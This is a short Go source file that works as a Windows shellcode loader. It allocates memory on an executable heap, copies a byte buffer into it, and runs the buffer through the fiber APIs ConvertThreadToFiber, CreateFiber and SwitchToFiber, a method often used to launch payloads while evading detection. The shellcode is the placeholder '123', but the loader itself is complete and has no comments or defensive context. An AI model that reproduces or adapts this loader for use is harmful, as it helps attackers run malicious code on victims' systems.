package main

import (
	"syscall"
	"unsafe"
)
var HEAP_CREATE_ENABLE_EXECUTE = 0x00040000

var Kernel32 = syscall.NewLazyDLL("Kernel32.dll")
var NtDll = syscall.NewLazyDLL("NtDll.dll")

var ConverThreadToFiber = Kernel32.NewProc("ConvertThreadToFiber")
var HeapCreate = Kernel32.NewProc("HeapCreate")
var HeapAlloc = Kernel32.NewProc("HeapAlloc")
var RtlCopyMemory = NtDll.NewProc("RtlCopyMemory")
var CreateFiber = Kernel32.NewProc("CreateFiber")
var SwitchToFiber = Kernel32.NewProc("SwitchToFiber")
func main(){
	shellcode := []byte("123")
	ConverThreadToFiber.Call(uintptr(0))
	Heap , _, _ := HeapCreate.Call(uintptr(HEAP_CREATE_ENABLE_EXECUTE),0,0)
	HeapMemory, _, _:= HeapAlloc.Call(Heap, 0, uintptr(len(shellcode)))
	RtlCopyMemory.Call(HeapMemory,uintptr(unsafe.Pointer(&shellcode[0])),uintptr(len(shellcode)))
	Fiber ,_ ,_ := CreateFiber.Call(0,HeapMemory,0)
	SwitchToFiber.Call(Fiber)
}